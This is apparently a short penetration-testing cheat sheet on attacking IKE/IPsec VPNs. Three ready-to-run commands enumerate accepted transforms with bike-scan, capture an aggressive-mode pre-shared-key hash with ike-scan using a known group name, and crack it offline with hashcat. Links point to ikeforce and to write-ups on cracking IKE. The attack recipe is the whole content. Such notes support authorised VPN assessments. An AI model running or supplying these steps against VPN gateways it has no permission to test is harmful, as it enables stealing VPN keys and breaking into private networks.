## ike-scan

It will need a valid group name. See the links below for tools to retrieve group names and the possible attacks:

* https://github.com/SpiderLabs/ikeforce
* https://www.trustwave.com/Resources/SpiderLabs-Blog/Cracking-IKE-Mission-Improbable-(Part-1)/
* https://www.trustwave.com/Resources/SpiderLabs-Blog/Cracking-IKE-Mission-Improbable-(Part-2)/
* https://www.trustwave.com/Resources/SpiderLabs-Blog/Cracking-IKE-Mission-Improbable-(Part3)/


**1. List all accepted transform with bike-scan**

```
git clone https://github.com/yaap7/bike-scan
sudo ./bike-scan.sh -AM -R=c 192.168.0.1
```

**2. Extract PSK with ike-scan**

```
sudo ike-scan -r 1 -M -A --id=<groupName> -a 5,2,1,2 192.168.0.1 -P192.168.0.1_GroupName.psk 
```

**3. Crack the PSK hash with hashcat**

```
hashcat64.bin -O -w 4 -m 5400 -a 0 -r all.rules 192.168.0.1_GroupName.psk  wordlist.txt
```


**See also:**
* https://github.com/SpiderLabs/ikeforce


